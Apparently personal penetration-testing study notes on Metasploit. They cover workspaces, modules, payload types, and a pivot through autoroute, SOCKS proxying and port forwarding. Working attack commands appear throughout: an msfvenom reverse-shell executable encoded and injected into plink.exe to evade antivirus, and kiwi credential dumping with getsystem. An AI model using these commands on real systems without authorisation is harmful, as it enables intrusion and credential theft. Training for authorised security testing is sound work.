commands : 

-> sudo systmctl start postgresql 
-> sudo systmctl enable postgresql 
-> sudo msfdb init
- the basic "service" command display all the results 
- the "db_nmap" command has identical syntax to nmap 
- To display all Discovered hosts we can issue a "hosts" command 
- "services -p 445 "	
- We can list the available workspaces with "workspace" 
- To create a workspace use : "workspace -a [workspace_name]"
- to switch to another workspace use : "workspace [workspace_name]"
- to delete a workspace use : "workspace -d [workspace_name]"

# Auxiliary Modules: 
	Provide Functionality like : Protocol enumeration, Port Scanning, Fuzzing, Sniffing, and More 
	command : "show auxiliary"  
	search command : "search type:auxiliary name:smb"
	common commands : use, info, show options 
	
- we can retrieve information regarding successful login attemps from the database using "creds"

# Exploit Modules : 
	Contain Exploit code for vulnerable application and services 
	 
# Metasploit Payload : 
	There are two types of Payload : 
		1. Non-Staged : this payload is sent in its entirety along with the exploit.
	 	2. Staged : This payload is sent in two parts : 
			1. first smaller part is sent 
			2. then the exploit code is sent with the help of smaller part 

ex.	windows/shell_reverse_tcp - connect back to attacker and spawn a command shell 
ex.	windows/shell/reverse_tcp - connet back to attacker, spawn a shell (staged)

# Meterpreter Payload : 
	Meterpreter is a multifunctional payload that can be dynamically extended at run time 
	It offers capabilities like : file transfer, keylogging and various other methods 
	command : 
	- sysinfo	
	- getuid
		
	Downloading and uploading of file using meterpreter : 

	uploading : 
	meterpreter > upload /usr/share/windows-resources/binaries/nc.exe c:\\Users\\offsec\\Desktop
	
	Downlading : 
	meterpreter > download c:\\windows\\system32\\calc.exe /temp/calc.exe

	Due to shell escaping we have to use 2 backslash 
			
# Executable Payload : 
	tool : msfvenom 
	Another useful feature of metasploit is the ability to inject a payload into a existing PE file,
	which may further reduce the chances of AV detection. The injection is done with "-x" flag, 
	Specifying the file to inject into. 

ex	msfvenom -p windows/shell_reverse_tcp LHOST= LPORT= -f exe -e x86/shikata_ga_nai -i 9 -x /user/share/
	windows-resources/binaries/plink.exe -o shell_reverse_msf_encoded_embedded.exe

	
# Metasploit Exploit Multi Handler : 
	This Hanler will work for both staged as well as Non Staged Payload 
	  		 

# Client Side Attacks : 
	kali@kali:-$ msfvenom -l formats 

 	- Advanced Feature and Transports : 
		we can proceed to more advance options using "show advanced"
		use exploit/multi/handler
		set payload windows/meterpreter/reverse_tcp
		set EnableStageEncoding true
		set stageencoder x86/shikata_ga_nai 
		
	- Transport options to switch between Protocols 

# Building your Own MSF Module : 
	
# Post Exploitation With Metasploit : 
	1. Core Post-Exploitation Feature 
	2. Migrating Process : "migrate [PID]"
	3. Post-Exploitation Modules : 
		use exploit/windows/local/bypassuac_injection_winsxs 
		this will only take session 
	we can also load extensions directly inside the active session with the "load" command 
	meterpreter > load powershell 
	
	meterpreter > load kiwi 
	meterpreter > getsystem 
	meterpreter > creds_msv 
	
# Pivoting With the Metasploit Framework : 
	1. First we find the network interface to which the machine is connected 
	use : "ipconfig"
	 
	2. Now the subnet we find is  192.168.0.1/24
	use route add 192.168.0.1/24
	
	3. route print
	
	Now we can enumerate this subnet 
	we have only configure route from victim to another subnet but not configure the reverse path 
	
	4. use multi/manage/autoroute 
	   set session [session_number]
	   exploit 
	
	we can also combine route with the server/socks4a module to configure a SOCKS proxy. this allows 
	application outside the metasploit framework to tunnel through the pivot 
	
	- use auxiliary/server/socks4a 
	- set SRVHOST 127.0.0.1
	- exploit -j 
	- kali@kali:-$ echo "socks4a 127.0.0.1 1080" >> /etc/proxychains.conf
	- proxychains rdesktop 192.168.0.111
		this will gives us a GUI of the computer in internal network of the compromised machine 
	
	## We can also use port forwarding which will forward a port to the internal network 
	
	meterpreter > portfwd add -l [listening_port] -p [forwarding_port] -r [IP-Internal] 
	
	kali@kali:-$ rdesktop 127.0.0.1
